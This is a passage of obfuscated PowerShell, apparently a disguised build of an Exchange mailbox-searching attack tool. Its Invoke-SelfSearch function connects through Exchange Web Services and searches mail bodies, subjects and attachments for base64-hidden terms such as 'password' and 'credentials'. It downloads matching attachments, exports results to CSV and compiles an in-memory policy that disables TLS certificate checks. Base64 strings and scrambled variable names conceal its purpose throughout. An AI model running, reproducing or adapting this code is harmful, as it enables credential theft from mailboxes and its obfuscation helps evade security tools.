        if ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAG0AcAAtACQATwB1AHQAcAB1AHQAQwBzAHYA'))))
        {
          ipcsv $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAG0AcAAtACQATwB1AHQAcAB1AHQAQwBzAHYA'))) | ConvertTo-Csv -NoTypeInformation | select -Skip 1 | Out-File -Encoding ascii -Append $OutputCsv
          rd $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAG0AcAAtACQATwB1AHQAcAB1AHQAQwBzAHYA')))
        }
    }
    else
    {
      ${___/=\_/=\___/==\} | ft -Property Sender,ReceivedBy,Subject,Body | Out-String
    }
  }
  if ($OutputCsv -ne "")
  {
    ${___/\/\/\_/\__/\_} = ipcsv $OutputCsv -Header Sender , ReceivedBy , Subject , Body
    ${___/\/\/\_/\__/\_} | epcsv $OutputCsv -NoTypeInformation
    Write-Host -foregroundcolor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKAFsAKgBdACAAUgBlAHMAdQBsAHQAcwAgAGgAYQB2AGUAIABiAGUAZQBuACAAbwB1AHQAcAB1AHQAIAB0AG8AIAAkAE8AdQB0AHAAdQB0AEMAcwB2AA==')))
  }
  echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKAFsAKgBdACAAUgBlAG0AbwB2AGkAbgBnACAAQQBwAHAAbABpAGMAYQB0AGkAbwBuAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIAByAG8AbABlACAAZgByAG8AbQAgACQASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBBAGMAYwBvAHUAbgB0AC4A')))
  Get-ManagementRoleAssignment -RoleAssignee $ImpersonationAccount -Role ApplicationImpersonation -RoleAssigneeType user | Remove-ManagementRoleAssignment -confirm:$fals
}
function Invoke-SelfSearch{
  Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $Mailbox = "",
    [Parameter(Position = 1, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",
    [Parameter(Position = 2, Mandatory = $False)]
    [string[]]$Terms = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAGUAbgB0AGkAYQBsAHMAKgA=')))),
    [Parameter(Position = 3, Mandatory = $False)]
    [int]
    $MailsPerUser = 100,
    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $OutputCsv = "",
    [Parameter(Position = 5, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010",
    [Parameter(Position = 6, Mandatory = $False)]
    [switch]
    $Remote,
    [Parameter(Position = 7, Mandatory = $False)]
    [string]
    $Folder = 'Inbox',
    [Parameter(Position = 8, Mandatory = $False)]
    [string]
    $Regex = '',
    [Parameter(Position = 9, Mandatory = $False)]
    [switch]
    $CheckAttachments,
    [Parameter(Position = 10, Mandatory = $False)]
    [string]
    $DownloadDir = "",
    [Parameter(Position = 11, Mandatory = $False)]
    [switch]
    $OtherUserMailbox
  )
  __/=\_/==\___/\___
  echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAHIAeQBpAG4AZwAgAEUAeABjAGgAYQBuAGcAZQAgAHYAZQByAHMAaQBvAG4AIAAkAEUAeABjAGgAYQBuAGcAZQBWAGUAcgBzAGkAbwBuAA==')))
  ${____/====\/\/=\__} = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
  ${/==\/\_______/\/=} = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService(${____/====\/\/=\__})
  if ($Remote)
  {
    ${_/==\__/====\__/=} = Get-Credential
    ${/==\/\_______/\/=}.UseDefaultCredentials = $false
    ${/==\/\_______/\/=}.Credentials = ${_/==\__/====\__/=}.GetNetworkCredential()
  }
  else
  {
    ${/==\/\_______/\/=}.UseDefaultCredentials = $true
  }
  ${/==\__/=\/\/=\_/=}=New-Object Microsoft.CSharp.CSharpCodeProvider
  ${/\_____/=\__/\__/}=${/==\__/=\/\/=\_/=}.CreateCompiler()
  ${__/\/\_/\_/\_/\__}=New-Object System.CodeDom.Compiler.CompilerParameters
  ${__/\/\_/\_/\_/\__}.GenerateExecutable=$False
  ${__/\/\_/\_/\_/\__}.GenerateInMemory=$True
  ${__/\/\_/\_/\_/\__}.IncludeDebugInformation=$False
  ${__/\/\_/\_/\_/\__}.ReferencedAssemblies.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAEwATAA=')))) > $null
  ${__/=\/\_/===\__/=}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIABuAGEAbQBlAHMAcABhAGMAZQAgAEwAbwBjAGEAbAAuAFQAbwBvAGwAawBpAHQARQB4AHQAZQBuAHMAaQBvAG4AcwAuAE4AZQB0AC4AQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAbwBsAGkAYwB5AHsADQAKACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVAByAHUAcwB0AEEAbABsACAAOgAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBJAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFQAcgB1AHMAdABBAGwAbAAoACkAIAB7ACAADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABiAG8AbwBsACAAQwBoAGUAYwBrAFYAYQBsAGkAZABhAHQAaQBvAG4AUgBlAHMAdQBsAHQAKABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQAIABzAHAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAuAFgANQAwADkAQwBlAHIAdABpAGYAaQBjAGEAdABlACAAYwBlAHIAdAAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAByAGUAcQAsACAAaQBuAHQAIABwAHIAbwBiAGwAZQBtACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAdAByAHUAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAB9AA=='))) 
  ${_/=\_/\_/=\___/\_}=${/==\__/=\/\/=\_/=}.CompileAssemblyFromSource(${__/\/\_/\_/\_/\__},${__/=\/\_/===\__/=})
  ${_/\_/======\__/==}=${_/=\_/\_/=\___/\_}.CompiledAssembly
  ${__/\_/==\________}=${_/\_/======\__/==}.CreateInstance($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAC4AVABvAG8AbABrAGkAdABFAHgAdABlAG4AcwBpAG8AbgBzAC4ATgBlAHQALgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkALgBUAHIAdQBzAHQAQQBsAGwA'))))
  [System.Net.ServicePointManager]::CertificatePolicy=${__/\_/==\________}
  if ($ExchHostname -ne "")
  {
    ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIABFAFcAUwAgAFUAUgBMACAA'))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA'))))
    ${/==\/\_______/\/=}.Url = new-object System.Uri(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA')))))
  }
  else
  {
    ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHUAdABvAGQAaQBzAGMAbwB2AGUAcgBpAG4AZwAgAGUAbQBhAGkAbAAgAHMAZQByAHYAZQByACAAZgBvAHIAIAA='))) + $Mailbox + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAuAC4A'))))
    ${/==\/\_______/\/=}.AutoDiscoverUrl($Mailbox, {$true})
  }    
    if($OtherUserMailbox)
    {
        ${/=\___/===\/=\_/=} = New-Object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox,$Mailbox)
        ${_/\/====\/\/=\___} = [Microsoft.Exchange.WebServices.Data.Folder]::Bind(${/==\/\_______/\/=},${/=\___/===\/=\_/=})
        ${_/\/=\__/=\/\/\_/} = New-Object Microsoft.Exchange.WebServices.Data.ItemView(1)
        ${_/=\___/=\/=\_/\/} = ${/==\/\_______/\/=}.FindItems(${_/\/====\/\/=\___}.Id,${_/\/=\__/=\/\/\_/})  
    }
    else
    {
        ${/=\___/===\/=\_/=} = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::MsgFolderRoot
        ${_/\___/=\___/===\} = New-Object Microsoft.Exchange.WebServices.Data.Mailbox( $Mailbox )
        ${/=\_______/=\___/} = New-Object Microsoft.Exchange.WebServices.Data.FolderId( ${/=\___/===\/=\_/=}, ${_/\___/=\___/===\})  
        ${/\_____/===\/\___} = [Microsoft.Exchange.WebServices.Data.Folder]::Bind(${/==\/\_______/\/=},${/=\_______/=\___/})
        ${/=======\/\/==\/\} = [Microsoft.Exchange.WebServices.Data.FolderView]100
        ${/=======\/\/==\/\}.Traversal=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGUAcAA=')))
        ${/\_____/===\/\___}.Load()
        if ($Folder -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwA'))))
        {
          ${__/==\_/=\/\/=\/=} = ${/\_____/===\/\___}.FindFolders(${/=======\/\/==\/\}) | ? { $_.DisplayName -eq $Folder }
        }
        else
        {
          ${__/==\_/=\/\/=\/=} = ${/\_____/===\/\___}.FindFolders(${/=======\/\/==\/\}) 
        }
    }
    ${___/=\_/=\___/==\} = @() 
    if($OtherUserMailbox)
    {
      ${_/\__/====\/\/=\/} = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
      ${_/\__/====\/\/=\/}.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text
      ${__/\/\___/\/\____} = ${_/\/====\/\/=\___}.FindItems($MailsPerUser)   
      if ($regex -eq "")
      {
        echo ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHMAZQBhAHIAYwBoAGkAbgBnACAAbQBhAGkAbABiAG8AeAA6ACAAJABNAGEAaQBsAGIAbwB4ACAAZgBvAHIAIAB0AGgAZQAgAHQAZQByAG0AcwAgACQAVABlAHIAbQBzAC4A'))))
      }
      else 
      {
        echo ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHMAZQBhAHIAYwBoAGkAbgBnACAAdABoAGUAIABtAGEAaQBsAGIAbwB4ADoAIAAkAE0AYQBpAGwAYgBvAHgAIAB3AGkAdABoACAAdABoAGUAIABzAHUAcABwAGwAaQBlAGQAIAByAGUAZwB1AGwAYQByACAAZQB4AHAAcgBlAHMAcwBpAG8AbgAuAA=='))))    
      }
      foreach (${_/=\___/=\/=\_/\/} in ${__/\/\___/\/\____}.Items)
      {    
        ${_/=\___/=\/=\_/\/}.Load(${_/\__/====\/\/=\/})
        if ($Regex -eq "")
        {
          foreach(${___/==\/\__/=\_/\} in $Terms)
          {
            if (${_/=\___/=\/=\_/\/}.Body.Text -like ${___/==\/\__/=\_/\})
            {
            ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
            }
            elseif (${_/=\___/=\/=\_/\/}.Subject -like ${___/==\/\__/=\_/\})
            {
            ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
            }
          }
        }
        else 
        {
          foreach(${_/\/\_/=\__/==\__} in $Regex)
          {
            if (${_/=\___/=\/=\_/\/}.Body.Text -match ${_/\/\_/=\__/==\__})
            {
            ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
            }
            elseif (${_/=\___/=\/=\_/\/}.Subject -match ${_/\/\_/=\__/==\__})
            {
            ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
            }
          }    
        }
        if ($CheckAttachments)
        {
          foreach(${/=\/\_/==\_/\____} in ${_/=\___/=\/=\_/\/}.Attachments)
          {
            if(${/=\/\_/==\_/\____} -is [Microsoft.Exchange.WebServices.Data.FileAttachment])
            {
              if(${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB0AHgAdAA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBoAHQAbQA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAGQAZgA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHMAMQA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBkAG8AYwA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB4AGwAcwA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBiAGEAdAA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBtAHMAZwA=')))))
              {
                ${/=\/\_/==\_/\____}.Load() | Out-Null
                ${/=\__/====\/\_/=\} = [System.Text.Encoding]::ASCII.GetString(${/=\/\_/==\_/\____}.Content)
                if ($Regex -eq "")
                {
                  foreach(${___/==\/\__/=\_/\} in $Terms)
                  {
                    if (${/=\__/====\/\_/=\} -like ${___/==\/\__/=\_/\})
                    {
                      echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHUAbgBkACAAYQB0AHQAYQBjAGgAbQBlAG4AdAAgAA=='))) + ${/=\/\_/==\_/\____}.Name)
                      ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
                      if ($DownloadDir -ne "")
                      { 
                        ${/=\/=\_/\/=\____/} = Get-Random
                        ${_____/==\__/=\/\/} = new-object System.IO.FileStream(($DownloadDir + "\" + ${/=\/=\_/\/=\____/} + "-" + ${/=\/\_/==\_/\____}.Name.ToString()), [System.IO.FileMode]::Create)
                        ${_____/==\__/=\/\/}.Write(${/=\/\_/==\_/\____}.Content, 0, ${/=\/\_/==\_/\____}.Content.Length)
                        ${_____/==\__/=\/\/}.Close()
                      }
                    }
                    elseif (${/=\__/====\/\_/=\} -like ${___/==\/\__/=\_/\})
                    {
                      echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHUAbgBkACAAYQB0AHQAYQBjAGgAbQBlAG4AdAAgAA=='))) + ${/=\/\_/==\_/\____}.Name)
                      ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
                      if ($DownloadDir -ne "")
                      { 
                        ${/=\/=\_/\/=\____/} = Get-Random
                        ${_____/==\__/=\/\/} = new-object System.IO.FileStream(($DownloadDir + "\" + ${/=\/=\_/\/=\____/} + ${/=\/\_/==\_/\____}.Name.ToString()), [System.IO.FileMode]::Create)
                        ${_____/==\__/=\/\/}.Write(${/=\/\_/==\_/\____}.Content, 0, ${/=\/\_/==\_/\____}.Content.Length)
                        ${_____/==\__/=\/\/}.Close()
                      }
                    }
                  }
                }
                else 
                {
                  foreach(${_/\/\_/=\__/==\__} in $Regex)
                  {
                    if (${/=\__/====\/\_/=\} -match ${_/\/\_/=\__/==\__})
                    {
                    echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHUAbgBkACAAYQB0AHQAYQBjAGgAbQBlAG4AdAAgAA=='))) + ${/=\/\_/==\_/\____}.Name)
                    ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
                      if ($DownloadDir -ne "")
                      { 
                        ${/=\/=\_/\/=\____/} = Get-Random
                        ${_____/==\__/=\/\/} = new-object System.IO.FileStream(($DownloadDir + "\" + ${/=\/=\_/\/=\____/} + ${/=\/\_/==\_/\____}.Name.ToString()), [System.IO.FileMode]::Create)
                        ${_____/==\__/=\/\/}.Write(${/=\/\_/==\_/\____}.Content, 0, ${/=\/\_/==\_/\____}.Content.Length)
                        ${_____/==\__/=\/\/}.Close()
                      }
                    }
                    elseif (${/=\__/====\/\_/=\} -match ${_/\/\_/=\__/==\__})
                    {
                    echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHUAbgBkACAAYQB0AHQAYQBjAGgAbQBlAG4AdAAgAA=='))) + ${/=\/\_/==\_/\____}.Name)
                    ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
                      if ($DownloadDir -ne "")
                      { 
                        ${/=\/=\_/\/=\____/} = Get-Random
                        ${_____/==\__/=\/\/} = new-object System.IO.FileStream(($DownloadDir + "\" + ${/=\/=\_/\/=\____/} + ${/=\/\_/==\_/\____}.Name.ToString()), [System.IO.FileMode]::Create)
                        ${_____/==\__/=\/\/}.Write(${/=\/\_/==\_/\____}.Content, 0, ${/=\/\_/==\_/\____}.Content.Length)
                        ${_____/==\__/=\/\/}.Close()
                      }
                    }
                  }    
                }
              }
            }
          }
        }
      }
    }
    else{
    Foreach(${/=\____/=\/\/=\/\} in ${__/==\_/=\/\/=\/=})
    {
        echo "[***] Found folder: $(${/=\____/=\/\/=\/\}.DisplayName)"
      try
      {
        ${_/\/====\/\/=\___} = [Microsoft.Exchange.WebServices.Data.Folder]::Bind(${/==\/\_______/\/=},${/=\____/=\/\/=\/\}.Id)
      }
      catch
      {
        ${/=\__/\_/\/==\/=\} = $_.Exception.Message
        if (${/=\__/\_/\/==\/=\} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBFAHgAYwBoAGEAbgBnAGUAIABTAGUAcgB2AGUAcgAgAGQAbwBlAHMAbgAnAHQAIABzAHUAcABwAG8AcgB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAHYAZQByAHMAaQBvAG4ALgAqAA=='))))
        {
          echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABFAFIAUgBPAFIAOgAgAFQAaABlACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAHQAbwAgAEUAeABjAGgAYQBuAGcAZQAgAGYAYQBpAGwAZQBkACAAdQBzAGkAbgBnACAARQB4AGMAaABhAG4AZwBlACAAVgBlAHIAcwBpAG8AbgAgACQARQB4AGMAaABhAG4AZwBlAFYAZQByAHMAaQBvAG4ALgA=')))
          echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAHIAeQAgAHMAZQB0AHQAaQBuAGcAIAB0AGgAZQAgAC0ARQB4AGMAaABhAG4AZwBlAFYAZQByAHMAaQBvAG4AIABmAGwAYQBnACAAdABvACAAdABoAGUAIABFAHgAYwBoAGEAbgBnAGUAIAB2AGUAcgBzAGkAbwBuACAAbwBmACAAdABoAGUAIABzAGUAcgB2AGUAcgAuAA==')))
          echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAG8AbQBlACAAbwBwAHQAaQBvAG4AcwAgAHQAbwAgAHQAcgB5ADoAIABFAHgAYwBoAGEAbgBnAGUAMgAwADAANwBfAFMAUAAxACwAIABFAHgAYwBoAGEAbgBnAGUAMgAwADEAMAAsACAARQB4AGMAaABhAG4AZwBlADIAMAAxADAAXwBTAFAAMQAsACAARQB4AGMAaABhAG4AZwBlADIAMAAxADAAXwBTAFAAMgAsACAARQB4AGMAaABhAG4AZwBlADIAMAAxADMALAAgAG8AcgAgAEUAeABjAGgAYQBuAGcAZQAyADAAMQAzAF8AUwBQADEALgA=')))
          break
        }
      }
      ${_/\__/====\/\/=\/} = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
      ${_/\__/====\/\/=\/}.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text
      ${__/\/\___/\/\____} = ${_/\/====\/\/=\___}.FindItems($MailsPerUser)   
      if ($regex -eq "")
      {
        echo ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHMAZQBhAHIAYwBoAGkAbgBnACAAbQBhAGkAbABiAG8AeAA6ACAAJABNAGEAaQBsAGIAbwB4ACAAZgBvAHIAIAB0AGgAZQAgAHQAZQByAG0AcwAgACQAVABlAHIAbQBzAC4A'))))
      }
      else 
      {
        echo ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHMAZQBhAHIAYwBoAGkAbgBnACAAdABoAGUAIABtAGEAaQBsAGIAbwB4ADoAIAAkAE0AYQBpAGwAYgBvAHgAIAB3AGkAdABoACAAdABoAGUAIABzAHUAcABwAGwAaQBlAGQAIAByAGUAZwB1AGwAYQByACAAZQB4AHAAcgBlAHMAcwBpAG8AbgAuAA=='))))    
      }
      foreach (${_/=\___/=\/=\_/\/} in ${__/\/\___/\/\____}.Items)
      {    
        ${_/=\___/=\/=\_/\/}.Load(${_/\__/====\/\/=\/})
        if ($Regex -eq "")
        {
          foreach(${___/==\/\__/=\_/\} in $Terms)
          {
            if (${_/=\___/=\/=\_/\/}.Body.Text -like ${___/==\/\__/=\_/\})
            {
            ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
            }
            elseif (${_/=\___/=\/=\_/\/}.Subject -like ${___/==\/\__/=\_/\})
            {
            ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
            }
          }
        }
        else 
        {
          foreach(${_/\/\_/=\__/==\__} in $Regex)
          {
            if (${_/=\___/=\/=\_/\/}.Body.Text -match ${_/\/\_/=\__/==\__})
            {
            ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
            }
            elseif (${_/=\___/=\/=\_/\/}.Subject -match ${_/\/\_/=\__/==\__})
            {
            ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
            }
          }    
        }
        if ($CheckAttachments)
        {
          foreach(${/=\/\_/==\_/\____} in ${_/=\___/=\/=\_/\/}.Attachments)
          {
            if(${/=\/\_/==\_/\____} -is [Microsoft.Exchange.WebServices.Data.FileAttachment])
            {
              if(${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB0AHgAdAA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBoAHQAbQA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAGQAZgA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHMAMQA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBkAG8AYwA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB4AGwAcwA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBiAGEAdAA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBtAHMAZwA=')))))
              {
                ${/=\/\_/==\_/\____}.Load() | Out-Null
                ${/=\__/====\/\_/=\} = [System.Text.Encoding]::ASCII.GetString(${/=\/\_/==\_/\____}.Content)
                if ($Regex -eq "")
                {
                  foreach(${___/==\/\__/=\_/\} in $Terms)
                  {
                    if (${/=\__/====\/\_/=\} -like ${___/==\/\__/=\_/\})
                    {
                      echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHUAbgBkACAAYQB0AHQAYQBjAGgAbQBlAG4AdAAgAA=='))) + ${/=\/\_/==\_/\____}.Name)
                      ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
                      if ($DownloadDir -ne "")
                      { 
                        ${/=\/=\_/\/=\____/} = Get-Random
                        ${_____/==\__/=\/\/} = new-object System.IO.FileStream(($DownloadDir + "\" + ${/=\/=\_/\/=\____/} + "-" + ${/=\/\_/==\_/\____}.Name.ToString()), [System.IO.FileMode]::Create)
                        ${_____/==\__/=\/\/}.Write(${/=\/\_/==\_/\____}.Content, 0, ${/=\/\_/==\_/\____}.Content.Length)
                        ${_____/==\__/=\/\/}.Close()
                      }
                    }
                    elseif (${/=\__/====\/\_/=\} -like ${___/==\/\__/=\_/\})
                    {
                      echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHUAbgBkACAAYQB0AHQAYQBjAGgAbQBlAG4AdAAgAA=='))) + ${/=\/\_/==\_/\____}.Name)
                      ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
                      if ($DownloadDir -ne "")
                      { 
                        ${/=\/=\_/\/=\____/} = Get-Random
                        ${_____/==\__/=\/\/} = new-object System.IO.FileStream(($DownloadDir + "\" + ${/=\/=\_/\/=\____/} + ${/=\/\_/==\_/\____}.Name.ToString()), [System.IO.FileMode]::Create)
                        ${_____/==\__/=\/\/}.Write(${/=\/\_/==\_/\____}.Content, 0, ${/=\/\_/==\_/\____}.Content.Length)
                        ${_____/==\__/=\/\/}.Close()
                      }
                    }
                  }
                }
                else 
                {
                  foreach(${_/\/\_/=\__/==\__} in $Regex)
                  {
                    if (${/=\__/====\/\_/=\} -match ${_/\/\_/=\__/==\__})
                    {
                    echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHUAbgBkACAAYQB0AHQAYQBjAGgAbQBlAG4AdAAgAA=='))) + ${/=\/\_/==\_/\____}.Name)
                    ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
                      if ($DownloadDir -ne "")
                      { 
                        ${/=\/=\_/\/=\____/} = Get-Random
                        ${_____/==\__/=\/\/} = new-object System.IO.FileStream(($DownloadDir + "\" + ${/=\/=\_/\/=\____/} + ${/=\/\_/==\_/\____}.Name.ToString()), [System.IO.FileMode]::Create)
                        ${_____/==\__/=\/\/}.Write(${/=\/\_/==\_/\____}.Content, 0, ${/=\/\_/==\_/\____}.Content.Length)
                        ${_____/==\__/=\/\/}.Close()
                      }
                    }
                    elseif (${/=\__/====\/\_/=\} -match ${_/\/\_/=\__/==\__})
                    {
                    echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHUAbgBkACAAYQB0AHQAYQBjAGgAbQBlAG4AdAAgAA=='))) + ${/=\/\_/==\_/\____}.Name)
                    ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
                      if ($DownloadDir -ne "")
                      { 
                        ${/=\/=\_/\/=\____/} = Get-Random
                        ${_____/==\__/=\/\/} = new-object System.IO.FileStream(($DownloadDir + "\" + ${/=\/=\_/\/=\____/} + ${/=\/\_/==\_/\____}.Name.ToString()), [System.IO.FileMode]::Create)
                        ${_____/==\__/=\/\/}.Write(${/=\/\_/==\_/\____}.Content, 0, ${/=\/\_/==\_/\____}.Content.Length)
                        ${_____/==\__/=\/\/}.Close()
                      }
                    }
                  }    
                }
              }
            }
          }
        }
      }
    }
   } 
  ${___/=\_/=\___/==\} | ft -Property Sender,ReceivedBy,Subject,Body
  if ($OutputCsv -ne "")
  { 
    ${___/=\_/=\___/==\} | %{ $_.Body = $_.Body -replace "`r`n",'\n' -replace ",",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JgAjADQANAA7AA==')))}
    ${___/=\_/=\___/==\} | select Sender,ReceivedBy,Subject,Body | epcsv $OutputCsv -encoding $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBUAEYAOAA=')))
  }
}
function Get-MailboxFolders{
  Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
